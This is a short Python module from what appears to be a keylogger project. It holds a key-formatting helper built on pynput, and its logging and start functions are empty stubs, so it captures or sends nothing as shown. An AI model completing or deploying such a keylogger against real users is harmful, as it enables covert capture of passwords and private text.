# core/logger.py

from pynput import keyboard
from config import LOG_FILE
from datetime import datetime

def format_key(key):
    """Format special keys to be readable"""
    try:
        return key.char  # For regular characters
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.shift_r: '[SHIFT]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.alt_r: '[ALT]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.delete: '[DEL]',
            keyboard.Key.caps_lock: '[CAPSLOCK]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]'
        }
        return special_keys.get(key, f'[{key.name.upper()}]')

def write_log(key):
    pass

def start_keylogger():
    pass
